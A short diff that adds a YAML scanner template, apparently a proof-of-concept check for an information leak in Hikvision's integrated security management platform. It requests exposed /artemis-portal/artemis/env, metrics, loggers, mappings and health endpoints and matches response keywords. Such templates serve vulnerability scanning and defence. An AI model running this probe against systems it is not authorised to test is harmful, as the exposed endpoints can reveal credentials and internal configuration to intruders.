@@ -1,0 +1,18 @@
+name: poc-yaml-HIKVISION-综合安防管理平台-leak
+description: "敏感信息泄露"
+method: GET
+path:
+  - /artemis-portal/artemis/env
+  - /artemis-portal/artemis/metrics
+  - /artemis-portal/artemis/loggers
+  - /artemis-portal/artemis/mappings
+  - /artemis-portal/artemis/health
+expression:
+  status: 200
+  body_any:
+    - "database"
+    - "profiles"
+    - "processors"
+    - "levels"
+    - "/webjars/"
+
